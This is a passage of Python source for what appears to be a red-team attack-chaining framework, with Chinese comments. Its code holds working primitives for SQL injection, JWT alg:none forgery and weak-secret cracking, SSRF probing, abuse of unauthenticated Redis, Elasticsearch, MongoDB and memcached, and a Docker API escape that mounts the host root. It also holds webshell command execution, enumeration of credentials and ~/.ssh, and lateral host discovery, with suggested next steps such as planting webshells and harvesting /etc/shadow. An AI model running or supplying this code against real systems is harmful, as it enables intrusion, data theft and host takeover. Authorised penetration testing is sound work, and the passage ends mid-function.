        a = get("1'").text()
        b = get("1''").text()
        if a != b:
            return Obs(True, "引号扰动产生响应分叉（注入面成立）")
        return Obs(False, "无分叉（该参数不注或被统一拦截）")
    if step == "exploit":
        truthy = get("1' and '1'='1").text()
        falsy = get("1' and '1'='2").text()
        normal = get("1").text()
        if truthy == falsy:
            return Obs(False, "布尔无分叉")
        # 真分支必须与原始值同响应：排除"任何扰动都改变响应"的非 SQL 差异源
        if truthy != normal:
            return Obs(False, "分叉非注入语义（真分支 ≠ 原始值响应）")
        ev = ctx.save("sqli-bool.json", {"truthy_len": len(truthy), "falsy_len": len(falsy),
                                         "normal_len": len(normal)})
        err = get("1' and extractvalue(1,concat(0x7e,version()))-- -").text()
        m = re.search(r"~([0-9][\w.:\-]+)", err)
        ver = m.group(1) if m else ""
        o.ok = True
        o.detail = f"SQLi oracle 成立（bool 分叉 + 与原值一致 + 报错回显 version={ver or '?'}）"
        o.gained = "db-access"
        o.evidence = {"bool": ev, "version": ver}
        o.next_steps = ["sqlmap --technique=E 接管", "redteam_vuln_add(high)"]
        return o
    if step == "verify":
        truthy = get("1' and '1'='1").text()
        falsy = get("1' and '1'='2").text()
        normal = get("1").text()
        ok = truthy != falsy and truthy == normal
        return Obs(ok, f"复测分叉={'成立' if truthy != falsy else '消失'} "
                       f"真分支=原值={truthy == normal}",
                   {"truthy_len": len(truthy), "falsy_len": len(falsy),
                    "normal_len": len(normal)})
    return Obs(False, f"未知 step {step}")


# --- exploit: JWT alg:none / 弱密钥 ---------------------------------------------
def _b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64u_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def jwt_forge(header: dict, payload: dict, secret: bytes | None = None) -> str:
    h = _b64u(json.dumps(header, separators=(",", ":")).encode())
    p = _b64u(json.dumps(payload, separators=(",", ":")).encode())
    signing = f"{h}.{p}".encode()
    if secret is None:
        return f"{h}.{p}."
    sig = _b64u(hmac.new(secret, signing, hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"


@primitive("jwt-none", "exploit", "http", "critical", requires=["token", "jwt_probe_url"])
def jwt_none(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    token = ctx.hints["token"]
    probe = ctx.hints["jwt_probe_url"]
    hdr = {"Authorization": "Bearer " + token, "Cookie": "token=" + token}
    hdr_none_body = {"Authorization": "Bearer forged", "Cookie": "token=forged"}
    if step == "probe":
        parts = token.split(".")
        if len(parts) != 3:
            return Obs(False, "token 非 JWT 三段式")
        h = json.loads(_b64u_dec(parts[0]))
        return Obs(True, f"JWT alg={h.get('alg')}", {"header": h})
    if step == "exploit":
        if ctx.dry_run and not ctx.execute:
            return Obs(False, "dry-run：跳过伪造")
        orig = json.loads(_b64u_dec(token.split(".")[1]))
        payload = dict(orig)
        payload["role"] = "admin"
        forged = jwt_forge({"alg": "none", "typ": "JWT"}, payload)
        ctx.hints["_forged_none"] = forged
        # 三重对照：匿名基线 / 原始 token / 伪造 token / 垃圾 token
        anon = ctx.req("GET", probe)
        orig_r = ctx.req("GET", probe, {"Authorization": "Bearer " + token,
                                        "Cookie": "token=" + token})
        r = ctx.req("GET", probe, {"Authorization": "Bearer " + forged,
                                   "Cookie": "token=" + forged})
        junk = ctx.req("GET", probe, {"Authorization": "Bearer junk.artex.junk"})
        # 伪造 200 且：端点本就要求认证（匿名 401/403）或伪造响应与原始 token 有差异；
        # 垃圾 token 必须被拒——否则是"任意 token 放行"的端点，不算 auth-bypass
        o.ok = (r.status == 200 and junk.status in (401, 403)
                and (anon.status in (401, 403) or orig_r.text() != r.text()))
        o.detail = (f"alg:none 伪造 {probe} → {r.status}（anon={anon.status} "
                    f"orig={orig_r.status} junk={junk.status}）")
        o.evidence = {"forged": forged, "status": r.status,
                      "anon_status": anon.status, "junk_status": junk.status}
        o.gained = "auth-bypass" if o.ok else ""
        o.next_steps = ["redteam_vuln_add(critical)", "越权接口收割"]
        return o
    if step == "verify":
        forged = ctx.hints.get("_forged_none")
        if not forged:
            return Obs(False, "无伪造 token 可复测")
        pos = ctx.req("GET", probe, {"Authorization": "Bearer " + forged})
        neg = ctx.req("GET", probe, {"Authorization": "Bearer junk.artex.junk"})
        return Obs(pos.status == 200 and neg.status in (401, 403),
                   f"阳性={pos.status} 阴性={neg.status}")
    return Obs(False, f"未知 step {step}")


@primitive("jwt-weak-secret", "exploit", "http", "high", requires=["token", "jwt_probe_url"])
def jwt_weak(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    token = ctx.hints["token"]
    probe = ctx.hints["jwt_probe_url"]
    secrets_list = ["secret", "jwt_secret", "changeme", "123456", "key", "jwt", "admin",
                    "password", "test", "dev", "supersecret", "your-256-bit-secret"]
    wl = ctx.hints.get("wordlist")
    if wl and os.path.exists(wl):
        with open(wl, "r", encoding="utf-8", errors="ignore") as f:
            secrets_list += [l.strip() for l in f if l.strip()][:5000]
    h, p = token.split(".")[:2]
    signing = f"{h}.{p}".encode()
    # 按 header.alg 选 SHA-2 家族；非 HS* 不适用弱密钥爆破
    _DIG = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    try:
        header = json.loads(_b64u_dec(h))
    except Exception as e:
        return Obs(False, f"JWT 头解析失败：{e}")
    alg = header.get("alg", "HS256")
    digest = _DIG.get(alg)
    if step == "probe":
        if digest is None:
            return Obs(False, f"alg={alg} 非对称/未知算法，不适用 HS 弱密钥爆破")
        return Obs(True, f"弱密钥爆破前置就绪（alg={alg}）")
    if step == "exploit":
        if digest is None:
            return Obs(False, f"alg={alg} 不适用")
        if ctx.dry_run and not ctx.execute:
            return Obs(False, "dry-run：跳过伪造")
        found = None
        for s in secrets_list:
            sig = _b64u(hmac.new(s.encode(), signing, digest).digest())
            if sig == token.split(".")[2]:
                found = s
                break
        if not found:
            return Obs(False, f"内置 {len(secrets_list)} 词表未命中（alg={alg}）")
        orig = json.loads(_b64u_dec(p).decode("utf-8", "replace"))
        payload = dict(orig); payload["role"] = "admin"
        forged = jwt_forge({"alg": alg, "typ": "JWT"}, payload, found.encode())
        ctx.hints["_forged_weak"] = (forged, found)
        # 三重对照：匿名 / 伪造 / 垃圾
        anon = ctx.req("GET", probe)
        r = ctx.req("GET", probe, {"Authorization": "Bearer " + forged})
        junk = ctx.req("GET", probe, {"Authorization": "Bearer junk.artex.junk"})
        o.ok = (r.status == 200 and junk.status in (401, 403)
                and (anon.status in (401, 403) or r.text() != anon.text()))
        o.detail = (f"弱密钥命中 secret={found!r}（alg={alg}），伪造 → {r.status}"
                    f"（anon={anon.status} junk={junk.status}）")
        o.gained = "auth-bypass" if o.ok else ""
        o.evidence = {"secret": found, "alg": alg}
        return o
    if step == "verify":
        forged, found = ctx.hints.get("_forged_weak", (None, None))
        if not forged:
            return Obs(False, "无伪造 token")
        pos = ctx.req("GET", probe, {"Authorization": "Bearer " + forged})
        bad = jwt_forge({"alg": "HS256", "typ": "JWT"}, {"sub": "x"}, (found + "x").encode())
        neg = ctx.req("GET", probe, {"Authorization": "Bearer " + bad})
        return Obs(pos.status == 200 and neg.status in (401, 403),
                   f"阳性={pos.status} 阴性={neg.status}")
    return Obs(False, f"未知 step {step}")


# --- exploit: SSRF 差分探针 ------------------------------------------------------
@primitive("ssrf-diff", "exploit", "http", "high", requires=["ssrf_param", "canary_url"])
def ssrf_diff(ctx: Ctx, step: str) -> Obs:
    param = ctx.hints["ssrf_param"]
    canary = ctx.hints["canary_url"]
    o = Obs()
    def get(url: str) -> Resp:
        return ctx.req("GET", f"/?{urllib.parse.urlencode({param: url})}")
    if step == "probe":
        r = get(canary)
        if "chain-canary" in r.text():
            return Obs(True, f"{param} 可达内网 canary（SSRF 成立）")
        return Obs(False, "canary 未回显")
    if step == "exploit":
        r = get(canary)
        dead = get("http://127.0.0.1:1/dead")
        ctx.save("ssrf-diff.json", {"canary_len": len(r.body), "dead_len": len(dead.body),
                                    "canary_status": r.status, "dead_status": dead.status})
        o.ok = "chain-canary" in r.text()
        o.detail = f"A-B 差分：canary={r.status}/len{len(r.body)} dead={dead.status}/len{len(dead.body)}"
        o.gained = "ssrf" if o.ok else ""
        o.evidence = {"canary": r.text()[:200]}
        o.next_steps = ["内网服务收割（6379/9200/2375 清单见 skills/unauth-exploit）"]
        return o
    if step == "verify":
        pos = "chain-canary" in get(canary).text()
        neg = "chain-canary" not in get("http://127.0.0.1:1/dead").text()
        # A-B-A 交替复测
        again = "chain-canary" in get(canary).text()
        return Obs(pos and neg and again, f"A={pos} B={neg} A'={again}")
    return Obs(False, f"未知 step {step}")


# --- entry/exploit: 未授权服务族（TCP） ------------------------------------------
@primitive("unauth-redis", "exploit", "tcp", "critical", ports=[6379])
def unauth_redis(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    if step == "probe":
        try:
            info = redis_cmd(ctx.host, ctx.port, "INFO", "server")
        except Exception as e:
            return Obs(False, f"连接失败：{e}")
        if isinstance(info, Exception):
            return Obs(False, f"需认证：{info}")
        ver = re.search(r"redis_version:([\d.]+)", str(info))
        return Obs(True, f"Redis 未授权 v={ver.group(1) if ver else '?'}", {"info": str(info)[:200]})
    if step == "verify":
        try:
            info = redis_cmd(ctx.host, ctx.port, "INFO", "server")
            return Obs(not isinstance(info, Exception), "复测未授权成立")
        except Exception as e:
            return Obs(False, f"复测失败：{e}")
    if step == "exploit":
        if ctx.dry_run and not ctx.execute:
            return Obs(False, "dry-run：跳过写探针")
        # 写探针（回滚）：SET 一个键并读回
        key = "chainctl:" + MARK
        redis_cmd(ctx.host, ctx.port, "SET", key, "probe")
        val = redis_cmd(ctx.host, ctx.port, "GET", key)
        db_dir = redis_cmd(ctx.host, ctx.port, "CONFIG", "GET", "dir")
        if val == "probe":
            o.ok = True
            o.detail = f"写权限成立（CONFIG dir={db_dir}）"
            o.gained = "db-access+file-write"
            o.evidence = {"key": key, "dir": str(db_dir)}
            o.next_steps = [
                "CONFIG SET dir=/var/www/html + dbfilename 写哥斯拉马（webshell-toolkit）",
                "写 SSH authorized_keys / cron 反弹（需授权确认）",
            ]
            redis_cmd(ctx.host, ctx.port, "DEL", key)
        else:
            o.detail = "可读但 SET 未生效（只读副本/ACL 限制）"
        return o
    return Obs(False, f"未知 step {step}")


@primitive("unauth-es", "exploit", "http", "critical", ports=[9200, 9201])
def unauth_es(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    if step == "probe":
        r = ctx.req("GET", "/")
        if r.status == 200 and b"cluster_name" in r.body:
            ver = re.search(r'"number"\s*:\s*"([^"]+)"', r.text())
            return Obs(True, f"Elasticsearch 未授权 v={ver.group(1) if ver else '?'}")
        return Obs(False, f"非 ES（{r.status}）")
    if step == "verify":
        r = ctx.req("GET", "/")
        return Obs(r.status == 200 and b"cluster_name" in r.body, "复测成立")
    if step == "exploit":
        r = ctx.req("GET", "/_cat/indices?format=json")
        idx = []
        try:
            idx = json.loads(r.text())
        except Exception:
            pass
        total = 0
        for i in idx[:20]:
            c = ctx.req("GET", f"/{urllib.parse.quote(i.get('index',''))}/_count")
            m = re.search(r'"count"\s*:\s*(\d+)', c.text())
            total += int(m.group(1)) if m else 0
        ctx.save("es-indices.json", idx)
        o.ok = True
        o.detail = f"{len(idx)} 个索引，样本计数 {total} 条"
        o.gained = "db-access"
        o.evidence = {"indices": len(idx), "sample_count": total}
        o.next_steps = ["redteam_vuln_add(critical)", "批量导出 + 计量落库"]
        return o
    return Obs(False, f"未知 step {step}")


@primitive("unauth-docker", "exploit", "http", "critical", ports=[2375, 2376])
def unauth_docker(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    if step == "probe":
        r = ctx.req("GET", "/version")
        if r.status == 200 and b"ApiVersion" in r.body:
            return Obs(True, "Docker API 未授权")
        return Obs(False, f"非 Docker API（{r.status}）")
    if step == "verify":
        r = ctx.req("GET", "/version")
        neg = ctx.req("GET", "/__nope__")
        return Obs(r.status == 200 and neg.status == 404, f"阳性={r.status} 阴性={neg.status}")
    if step == "exploit":
        r = ctx.req("GET", "/containers/json")
        if r.status != 200:
            return Obs(False, f"containers/json 被拒 {r.status}，未取得容器视图")
        try:
            containers = json.loads(r.text() or "[]")
        except Exception:
            containers = []
        ctx.save("docker-containers.json", r.text()[:4000])
        if ctx.execute:
            body = {"Image": "alpine", "Cmd": ["sh", "-c", "id > /mnt/root/artex-proof.txt"],
                    "Binds": ["/:/mnt/root"], "HostConfig": {"Binds": ["/:/mnt/root"]}}
            cname = "chainctl-" + MARK[:8]
            c = ctx.req("POST", f"/containers/create?name={cname}",
                        {"Content-Type": "application/json"}, json.dumps(body).encode())
            m = re.search(r'"Id"\s*:\s*"([^"]+)"', c.text())
            started = False
            st = None
            cid = ""
            if m:
                cid = m.group(1)
                st = ctx.req("POST", f"/containers/{cid}/start")
                started = st.status in (200, 204, 304)
            # 落地复测：容器必须真实出现在容器列表，证明 create+start 生效
            ls = ctx.req("GET", "/containers/json")
            listed = cname in ls.text()
            if not (cid and started and listed):
                return Obs(False, f"容器创建/启动未实证（create={c.status} started={started} listed={listed}）")
            o.ok = True
            o.detail = f"宿主根目录挂载容器已启动并列入容器表（id={cid[:12]}）→ 宿主 root"
            o.gained = "root-container"
            o.evidence = {"container_id": cid, "proof": "/artex-proof.txt",
                          "start_status": st.status if st else None, "listed": listed}
            o.next_steps = ["redteam_vuln_add(critical)", "chroot 收割 /etc/shadow、密钥"]
        else:
            o.ok = True
            o.detail = f"{len(containers)} 个容器可见，挂载 RCE 待 --execute"
            o.gained = "root-capable"
        return o
    return Obs(False, f"未知 step {step}")


def _db_names(container) -> list:
    """BSON 数组解码后既可能是 dict({'0':{...}}) 也可能是 list，统一成名字列表。"""
    if isinstance(container, dict):
        items = list(container.values())
    elif isinstance(container, list):
        items = container
    else:
        return []
    out = []
    for it in items:
        if isinstance(it, dict):
            out.append(it.get("name") or it.get("db") or it)
        else:
            out.append(it)
    return out


@primitive("unauth-mongo", "exploit", "tcp", "critical", ports=[27017, 27018])
def unauth_mongo(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    if step in ("probe", "verify"):
        try:
            hello = mongo_op_msg(ctx.host, ctx.port, {"hello": 1})
            if hello.get("ok") == 1.0:
                if step == "verify":
                    return Obs(True, "复测 hello ok=1")
                lst = mongo_op_msg(ctx.host, ctx.port, {"listDatabases": 1})
                if lst.get("ok") == 1.0 and "databases" in lst:
                    names = _db_names(lst["databases"])
                    return Obs(True, f"MongoDB 未授权（{len(names)} 库可见）", {"dbs": names[:10]})
                return Obs(False, "hello 通但 listDatabases 被拒（authRequired）")
            return Obs(False, "hello 失败")
        except Exception as e:
            return Obs(False, f"Mongo 探测失败：{e}")
    if step == "exploit":
        lst = mongo_op_msg(ctx.host, ctx.port, {"listDatabases": 1})
        ctx.save("mongo-dbs.json", json.dumps(lst, ensure_ascii=False, default=str))
        names = _db_names(lst.get("databases"))
        o.ok = lst.get("ok") == 1.0
        o.detail = f"listDatabases → {len(names)} 库：{names[:5]}"
        o.gained = "db-access" if o.ok else ""
        o.evidence = {"dbs": names[:20]}
        return o
    return Obs(False, f"未知 step {step}")


@primitive("unauth-memcache", "exploit", "tcp", "high", ports=[11211])
def unauth_memcache(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    if step == "probe":
        try:
            stats = memcache_stats(ctx.host, ctx.port)
        except Exception as e:
            return Obs(False, f"连接失败：{e}")
        if stats:
            return Obs(True, f"memcached 未授权 v={stats.get('version','?')}", {"stats_n": len(stats)})
        return Obs(False, "无 STAT 回显")
    if step == "verify":
        try:
            stats = memcache_stats(ctx.host, ctx.port)
            # 阴性对照：未知命令必须回 ERROR（证明对面真是 memcached 协议语义）
            neg_raw = tcp_roundtrip(ctx.host, ctx.port, b"artex-bogus\r\n", 5.0)
            neg = b"ERROR" in neg_raw
            return Obs(bool(stats) and neg, f"复测：STAT={bool(stats)} 协议对照={neg}")
        except Exception as e:
            return Obs(False, f"复测失败：{e}")
    if step == "exploit":
        try:
            stats = memcache_stats(ctx.host, ctx.port)
        except Exception as e:
            return Obs(False, f"stats 失败：{e}")
        ctx.save("memcache-stats.json", stats)
        o.ok = bool(stats)
        o.detail = f"STAT {len(stats)} 项（当前项数 {stats.get('curr_items','?')}）"
        o.gained = "db-access" if o.ok else ""
        return o
    return Obs(False, f"未知 step {step}")


# --- foothold: WebShell 通道 + post-enum ----------------------------------------
@primitive("shell-channel", "foothold", "http", "critical",
           requires=["shell_url", "shell_key"])
def shell_channel(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    ch = ShellChannel(ctx.hints["shell_url"], ctx.hints["shell_key"])
    if step == "probe":
        ok, out = ch.exec("echo " + MARK)
        return Obs(ok and MARK in out, f"通道实测：{'通' if ok else '不通'}", {"out": out[:120]})
    if step == "verify":
        ok, out = ch.exec("echo verify-" + MARK)
        return Obs(ok and ("verify-" + MARK) in out, "复测执行通过")
    if step == "exploit":
        ok, out = ch.exec("id; hostname; uname -a")
        o.ok = ok
        o.detail = f"通道建立：{out.strip()[:80]}"
        o.gained = "shell-channel" if ok else ""
        o.evidence = {"id_out": out.strip()}
        return o
    return Obs(False, f"未知 step {step}")


@primitive("post-unix-enum", "privesc", "http", "high",
           requires=["shell_url", "shell_key"])
def post_unix_enum(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    ch = ShellChannel(ctx.hints["shell_url"], ctx.hints["shell_key"])
    cmds = [
        ("id", r"id"),
        ("uname", "uname -a; cat /etc/os-release 2>/dev/null | head -3"),
        ("net", "ip -br a 2>/dev/null || ifconfig -a 2>/dev/null || hostname -I"),
        ("suid", "find / -perm -4000 -type f 2>/dev/null | head -20"),
        ("sudo", "sudo -n -l 2>&1 | head -20"),
        ("cron", "ls -la /etc/cron* 2>/dev/null; crontab -l 2>/dev/null"),
        ("creds", "env | grep -iE 'pass|token|key|secret' | head -10; ls -la ~/.ssh 2>/dev/null"),
        ("hosts", "cat /etc/hosts; cat ~/.ssh/known_hosts 2>/dev/null | head -10"),
    ]
    if step == "probe":
        ok, out = ch.exec("echo " + MARK)
        return Obs(ok and MARK in out, "通道可用（后渗透前置）", {"out": out[:80]})
    if step == "exploit":
        results = {}
        for name, cmd in cmds:
            ok, out = ch.exec(cmd)
            results[name] = out if ok else f"<fail:{out[:40]}>"
        ctx.save("post-enum.json", results)
        id_out = results.get("id", "")
        # 通道可用门控：id 必须真实返回 uid=（全部 <fail> 时不得记 user-shell）
        if "uid=" not in id_out:
            return Obs(False, f"通道执行失败：{id_out[:60]}")
        uid0 = "uid=0" in id_out
        lateral = re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", results["hosts"])
        o.ok = True
        o.detail = f"后渗透枚举完成 uid0={uid0} lateral候选={sorted(set(lateral))[:5]}"
        o.gained = "root" if uid0 else "user-shell"
        o.evidence = {"file": "post-enum.json", "lateral": sorted(set(lateral))[:10]}
        o.next_steps = [] if uid0 else [
            "SUID/sudo 清单人工研判（技能 chains-priv）",
            "凭据收割 + hashcat（技能 credential-attack）",
        ]
        return o
    if step == "verify":
        ok, out = ch.exec("echo enum-" + MARK)
        return Obs(ok and ("enum-" + MARK) in out, "通道复测")
    return Obs(False, f"未知 step {step}")


@primitive("lateral-candidates", "lateral", "http", "info",
           requires=["shell_url", "shell_key"])
def lateral_candidates(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    ch = ShellChannel(ctx.hints["shell_url"], ctx.hints["shell_key"])
    if step == "probe":
        ok, out = ch.exec("echo " + MARK)
        return Obs(ok and MARK in out, "通道可用（横向前置）")
    if step == "exploit":
        ok, hosts = ch.exec("cat /etc/hosts; arp -a 2>/dev/null | head; ip neigh 2>/dev/null | head")
        ips = sorted(set(re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", hosts)))
        ctx.save("lateral-hosts.txt", hosts)
        o.ok = ok
        o.detail = f"内网邻居 {len(ips)} 个"
        o.evidence = {"ips": ips[:20]}
        o.next_steps = ["fscan/gogo 经隧道打内网（技能 fscan-intranet / gogo-scan）"]
        return o
    return Obs(False, f"未知 step {step}")


# ---------------------------------------------------------------------------
# 链引擎
# ---------------------------------------------------------------------------
STAGE_ORDER = ["entry", "exploit", "foothold", "privesc", "lateral"]


def port_hint_primitives(port: int) -> list[str]:
    out = []
    for pid, p in PRIMITIVES.items():
        if port in p["ports"]:
            out.append(pid)
    return out


def build_plan(target: str, profile: str = "auto", hints: dict | None = None) -> dict:
    scheme, host, port, _ = parse_url(target if "://" in target else f"http://{target}")
    hints = dict(hints or {})
    port = hints.pop("port", port)
    chosen = ["http-fingerprint"]
    if profile in ("auto", "web"):
        chosen += ["spring-actuator", "tomcat-put", "sqli-oracle", "lfi-environ-rce",
                   "upload-bypass", "jwt-none", "jwt-weak-secret", "ssrf-diff"]
    if profile in ("auto", "db", "host"):
        chosen += ["unauth-redis", "unauth-es", "unauth-docker", "unauth-mongo",
                   "unauth-memcache", "php-fpm-unauth"]
    if profile in ("auto", "host"):
        chosen += ["shell-channel", "post-unix-enum", "lateral-candidates"]
    # 指纹重排：hints 里指出的产品优先
    fp = (hints.get("fingerprint") or {})
    joined = " ".join(str(v) for v in fp.values()).lower() if isinstance(fp, dict) else ""
    def product_rank(pid: str) -> int:
        prods = PRIMITIVES[pid]["products"]
        return 0 if any(s in joined for s in prods) else 1
    chosen = sorted(set(chosen), key=lambda p: (STAGE_ORDER.index(PRIMITIVES[p]["stage"]),
                                                product_rank(p)))
    # 缺上下文的原语后置并标记 skip
    plan = {"target": target, "profile": profile, "port": port, "hints": hints,
            "primitives": chosen, "generated": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
    return plan


def run_plan(plan: dict, run_dir: str, allow: list[str], execute: bool,
             rps: float = 5.0, only_verify: bool = False) -> dict:
    scheme, host, port, _ = parse_url(plan["target"])
    ledger = os.path.join(run_dir, "ledger.jsonl")
    ctx = Ctx(target=plan["target"], host=host, port=port, allow=Scope(allow),
              run_dir=run_dir, dry_run=not execute, execute=execute,
              hints=dict(plan.get("hints") or {}), ledger_path=ledger, rps=rps)
    scope = Scope(allow)
    scope.check(host)
    results = []
    for pid in plan["primitives"]:
        meta = PRIMITIVES.get(pid)
        if not meta:
            continue
        missing = [k for k in meta["requires"] if k not in ctx.hints]
        if missing and pid != "http-fingerprint":
            rec = ctx.log(pid, meta["stage"], "skip",
                          Obs(False, f"缺上下文 {missing}"), severity=meta["severity"])
            results.append(rec)
            continue
        fn = meta["fn"]
        # probe（除 post 原语外必须 probe 命中才 exploit）
        try:
            if only_verify:
                obs = fn(ctx, "verify")
                rec = ctx.log(pid, meta["stage"], "verify", obs, severity=meta["severity"])
                results.append(rec)
                continue
            obs = fn(ctx, "probe")
            rec = ctx.log(pid, meta["stage"], "probe", obs, severity=meta["severity"])
            results.append(rec)
            if not obs.ok or meta["stage"] == "entry":
                continue
            obs2 = fn(ctx, "exploit")
            rec2 = ctx.log(pid, meta["stage"], "exploit", obs2, severity=meta["severity"])
            results.append(rec2)
            if obs2.ok:
                obs3 = fn(ctx, "verify")
                rec3 = ctx.log(pid, meta["stage"], "verify", obs3, severity=meta["severity"])
                results.append(rec3)
        except ScopeError as e:
            results.append(ctx.log(pid, meta["stage"], "blocked", Obs(False, str(e))))
        except Exception as e:
            results.append(ctx.log(pid, meta["stage"], "error",
                                   Obs(False, f"{type(e).__name__}: {e}")))
    return {"run_dir": run_dir, "ledger": ledger, "results": results}


# ===========================================================================
# Java 中间件族原语（weblogic-t3iiop / shiro-rememberme / struts2-ognl /
# fastjson-rce / druid-unauth / jenkins-script）
# ===========================================================================

# --- WebLogic T3/IIOP 反序列化 ------------------------------------------------
_WEBLOGIC_CVE = [
    # (版本前缀, CVE, 说明)——版本区间 → 历史 T3 反序列化漏洞面
    ("12.2.1.4", "CVE-2020-2883/CVE-2020-14882 族", "12.2.1.4 补丁线，T3+console 双面"),
    ("12.2.1.3", "CVE-2019-2725/CVE-2020-2883", "12.2.1.x 反序列化收敛补丁线"),
    ("12.2.1", "CVE-2017-3248/CVE-2016-3510", "12.2.1 早期 T3 反序列化"),
    ("12.1.3", "CVE-2015-4852/CVE-2016-0638/CVE-2017-3248", "10.3.6 同代补丁线"),
    ("12.1.2", "CVE-2015-4852 族", "T3 原生反序列化暴露"),
    ("12.1.1", "CVE-2015-4852 族", "T3 原生反序列化暴露"),
    ("12.0", "CVE-2015-4852 族", "老版本全线暴露"),
    ("10.3.6", "CVE-2015-4852/CVE-2016-0638/CVE-2017-3248/CVE-2019-2890", "最经典 T3 反序列化目标"),
    ("10.3.5", "CVE-2015-4852 族", "10.3.x 早期"),
    ("10.3.4", "CVE-2015-4852 族", "10.3.x 早期"),
    ("10.3.3", "CVE-2015-4852 族", "10.3.x 早期"),
    ("10.0", "CVE-2015-4852 族", "老版本全线暴露"),
]


def _t3_handshake(host: str, port: int, timeout: float = 6.0) -> bytes:
    """T3 协议头握手：t3 <ver>\\nAS:..\\nHL:..\\n\\n → HELO: 版本串"""
    payload = b"t3 12.2.1\nAS:2048\nHL:19\n\n"
    return tcp_roundtrip(host, port, payload, timeout=timeout, read_wait=1.0)


@primitive("weblogic-t3iiop", "exploit", "tcp", "critical",
           ports=[7001, 7002, 7003], products=["weblogic"])
def weblogic_t3iiop(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    if step in ("probe", "verify"):
        try:
            resp = _t3_handshake(ctx.host, ctx.port)
        except Exception as e:
            return Obs(False, f"T3 连接失败：{e}")
        txt = resp.decode("utf-8", "replace")
        is_helo = "HELO" in txt
        ver = ""
        m = re.search(r"HELO[:\s]*([0-9][0-9.]*[^\s]*)", txt)
        if m:
            ver = m.group(1).rstrip(".")
        if step == "probe":
            if is_helo:
                ctx.hints["_t3_version"] = ver
                return Obs(True, f"WebLogic T3 判活 HELO 版本={ver or '?'}",
                           {"banner": txt.strip()[:200], "version": ver})
            return Obs(False, f"非 T3 语义（首行={txt.splitlines()[0][:60] if txt else '空'!r})",
                       {"banner": txt[:120]})
        # verify：阳性=重复握手仍回 HELO 且版本一致；阴性=畸形头不再返回 HELO
        try:
            neg = tcp_roundtrip(ctx.host, ctx.port, b"GARBAGE-HEADER\r\n\r\n",
                                timeout=6.0, read_wait=0.6).decode("utf-8", "replace")
        except Exception:
            neg = ""
        pos_ok = is_helo and ver == ctx.hints.get("_t3_version", ver)
        neg_ok = "HELO" not in neg
        o.ok = pos_ok and neg_ok
        o.detail = f"阳性(重复握手 HELO v={ver})={pos_ok} 阴性(畸形头无 HELO)={neg_ok}"
        o.evidence = {"version": ver, "neg_banner": neg.strip()[:80]}
        return o
    if step == "exploit":
        ver = ctx.hints.get("_t3_version", "")
        if not ver:
            try:
                resp = _t3_handshake(ctx.host, ctx.port)
                m = re.search(r"HELO[:\s]*([0-9][0-9.]*)", resp.decode("utf-8", "replace"))
                ver = m.group(1) if m else ""
            except Exception as e:
                return Obs(False, f"T3 连接失败：{e}")
        cves = []
        for prefix, cve, _note in _WEBLOGIC_CVE:
            if ver.startswith(prefix):
                if cve not in cves:
                    cves.append(cve)
        # 序列化流判面：握手后追加 aced0005 探针，观察服务端是否按协议继续/报错而非直接断
        ser_probe = b"aced0005" + b"\x00" * 24
        try:
            raw = tcp_roundtrip(ctx.host, ctx.port,
                                b"t3 12.2.1\nAS:2048\nHL:19\n\n" + ser_probe,
                                timeout=6.0, read_wait=1.2)
            blob = raw.decode("utf-8", "replace")
        except Exception:
            blob = ""
        ctx.save("weblogic-t3.json", {"version": ver, "cves": cves,
                                      "ser_probe_resp": blob[:500]})
        o.ok = True
        o.detail = f"WebLogic T3 反序列化暴露面（v={ver or '?'}，CVE={';'.join(cves) or '未知区间'}）"
        o.gained = "deserialization-surface"
        o.evidence = {"version": ver, "cves": cves, "ser_probe": bool(blob)}
        o.next_steps = [
            "取 ysoserial gadget（按 WebLogic 依赖版本匹配）经 T3 投递（需 --execute）",
            "IIOP 7002 分支（CVE-2023-21839 WLInitialContextFactory JNDI）",
        ]
        return o
    return Obs(False, f"未知 step {step}")


# --- Shiro rememberMe：默认密钥 AES-CBC 爆破 ---------------------------------
# 纯标准库 AES-128-CBC（加密方向），已与 JDK javax.crypto 对拍逐字节一致。
_SHIRO_SBOX = None


def _gf_mul(a: int, b: int) -> int:
    p = 0
    for _ in range(8):
        if b & 1:
            p ^= a
        hi = a & 0x80
        a = (a << 1) & 0xFF
        if hi:
            a ^= 0x1B
        b >>= 1
    return p


def _aes_sbox() -> list:
    global _SHIRO_SBOX
    if _SHIRO_SBOX is None:
        exp = [0] * 256
        log = [0] * 256
        x = 1
        for i in range(255):
            exp[i] = x
            log[x] = i
            x = x ^ ((x << 1) & 0xFF) ^ (0x1B if x & 0x80 else 0)
        sb = [0] * 256
        for i in range(256):
            inv = 0 if i == 0 else exp[(255 - log[i]) % 255]
            r1 = ((inv << 1) | (inv >> 7)) & 0xFF
            r2 = ((inv << 2) | (inv >> 6)) & 0xFF
            r3 = ((inv << 3) | (inv >> 5)) & 0xFF
            r4 = ((inv << 4) | (inv >> 4)) & 0xFF
            sb[i] = inv ^ r1 ^ r2 ^ r3 ^ r4 ^ 0x63
        _SHIRO_SBOX = sb
    return _SHIRO_SBOX


def _aes128_expand(key: bytes) -> list:
    sbox = _aes_sbox()
    w = [list(key[4 * i: 4 * i + 4]) for i in range(4)]
    rcon = 1
    for i in range(4, 44):
        t = list(w[i - 1])
        if i % 4 == 0:
            t = t[1:] + t[:1]
            t = [sbox[b] for b in t]
            t[0] ^= rcon
            rcon = _gf_mul(rcon, 2)
        w.append([w[i - 4][j] ^ t[j] for j in range(4)])
    return w


def _aes128_cbc_encrypt(key: bytes, data: bytes, iv: bytes) -> bytes:
    sbox = _aes_sbox()
